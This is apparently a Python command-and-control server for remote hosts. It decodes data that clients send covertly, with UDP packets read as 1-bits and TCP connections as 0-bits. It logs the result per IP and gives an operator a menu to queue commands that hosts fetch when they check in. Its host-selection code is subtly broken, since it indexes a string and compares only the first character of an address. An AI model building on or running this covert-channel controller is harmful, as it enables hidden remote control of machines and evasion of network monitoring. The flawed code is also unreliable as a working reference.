import socket as Socket
from socket import socket
import threading
import time

#TODO develop better methods of tracking hosts to account for non-static ip's

EOF = False
LOCK = threading.Lock()
LISTLOCK = threading.Lock()
LOGLOCK = threading.Lock()
MESSAGEEVENT = threading.Event()
HOSTDICT = dict()
HOSTLOG = dict()
PORT = 1234
HOST = "127.0.0.1"


#Determines state of client
def recv_client_list(clientAddr,BinaryDict:dict):
    global LISTLOCK
    global HOSTDICT
    global HOSTLOG
    global LOGLOCK
    if clientAddr not in HOSTDICT.keys(): #Checks if a client is a known host
        BinaryDict[clientAddr] = []
        LISTLOCK.acquire()
        HOSTDICT[clientAddr] = list() #adds if not
        LISTLOCK.release()
        LOGLOCK.acquire()
        HOSTLOG[clientAddr] = ""
        LOGLOCK.release()


#Thread function
def handle_UDP(UDPsock:socket,BinaryDict:dict):
    global EOF
    global LOCK
    while True:
        try:
            data, addr = UDPsock.recvfrom(1024)
        except Socket.timeout:
            continue
        LOCK.acquire()
        recv_client_list(addr[0],BinaryDict)
        if data != b"END" and not EOF:
            BinaryDict[addr[0]].append("1")
        else: #Message complete.
            EOF = True
        LOCK.release()
            


#Thread function
def handle_TCP(TCPsock:socket,BinaryDict:dict,senderIp:list):
    global EOF
    global LOCK
    while True:
        while not EOF: #Main loop
            try:
                clientSock, clientAddr = TCPsock.accept()
            except Socket.timeout:
                continue

            LOCK.acquire()
            recv_client_list(clientAddr[0],BinaryDict)
            BinaryDict[clientAddr[0]].append("0")
            clientSock.close()
            LOCK.release()

        #Final return command
        while True:
            try:
                clientSock, clientAddr = TCPsock.accept()
                break
            except Socket.timeout:
                continue
        clientSock.send(send_client_list(clientAddr[0]).encode())
        clientSock.close()
        senderIp.append(clientAddr[0])
        EOF = False
        MESSAGEEVENT.set()


#Main incoming traffic handler
def receive_traffic(serverSocketUDP:socket,serverSocketTCP:socket):
    global HOSTLOG
    BinaryDict = dict()
    senderIp = []

    #This is receiving data
    udp_Thread = threading.Thread(target=handle_UDP,args=(serverSocketUDP,BinaryDict)) #Handles ones
    tcp_Thread = threading.Thread(target=handle_TCP,args=(serverSocketTCP,BinaryDict,senderIp)) #Handles zeros
    threads = [udp_Thread,tcp_Thread]

    for thread in threads:
        thread.start()

    while True:
        MESSAGEEVENT.wait()
        messageIp = senderIp.pop(0)
        output = decode(BinaryDict[messageIp]) #TODO make multi host friendly
        BinaryDict[messageIp] = []
        if output != "":
            HOSTLOG[messageIp] += output+"\n"
        MESSAGEEVENT.clear()


#Convert the collected binary list into a string
def decode(BinaryList:list):
    message = ""
    binaryString = ""
    for i in range(len(BinaryList)):
        binaryString += BinaryList[i] #int to string
    for i in range(0,len(binaryString),8):
        message += chr(int(binaryString[i:i+8],2)) #Binary piece -> ASCII code -> Char
    return message


#Fetch queued commands and return
def send_client_list(clientAddr) -> str: #Multi-threaded
    global LISTLOCK
    global HOSTDICT
    with LISTLOCK:
        if len(HOSTDICT.get(clientAddr, [])) == 0: #Dict with Addr tuple keys and a list of commands as values.
            return "SLP"
        else:
            return HOSTDICT[clientAddr].pop(0)


#Builder for sockets
def build_socket(sockType, host:str, port:int) -> socket: 
    serverSock = Socket.socket(Socket.AF_INET,sockType)
    serverSock.setsockopt(Socket.SOL_SOCKET,Socket.SO_REUSEADDR,1)
    serverSock.settimeout(0.1)
    serverSock.bind((host,port))
    return serverSock


def receiver_thread():
    serverSocketTCP = build_socket(Socket.SOCK_STREAM,HOST,PORT)
    serverSocketTCP.listen(5)
    serverSocketUDP = build_socket(Socket.SOCK_DGRAM,HOST,PORT)

    while True:
        receive_traffic(serverSocketUDP,serverSocketTCP)


def display_options():
    global HOSTLOG
    ipList = []
    selectedHost = "INVALID"
    with LISTLOCK:
        for clientIp in HOSTDICT.keys(): #Build list of IP's from HOSTDICT
            ipList.append(clientIp)
    ipList.sort() #Sort for consistent display
    optionNum = 0
    for ip in ipList:
        print(str(optionNum+1)+": "+ip) #One is added for user's sake
        optionNum += 1
    print(str(optionNum+1)+": refresh")
    userChoice = int(input("Select option: ").strip())-1 #Adjusted for 0th index
    if str(userChoice) == str(optionNum): #Refresh option
        print("Refreshing...")
        return
    else:
        with LISTLOCK:
            for clientIp in HOSTDICT.keys():
                if clientIp[0] == ip[userChoice]:
                    selectedHost = clientIp
    userChoice = input("1: view logs\n2: input command\n>:")
    if userChoice == "1":
        print(HOSTLOG[selectedHost])
        HOSTLOG[selectedHost] = ""
    elif userChoice == "2":
        command = input("Input command: ").strip()
        with LISTLOCK:
            HOSTDICT[selectedHost].append(command)


def main():
    mainReceiver = threading.Thread(target=receiver_thread,args=())
    mainReceiver.start()
    while True:
        time.sleep(1)
        display_options()

main()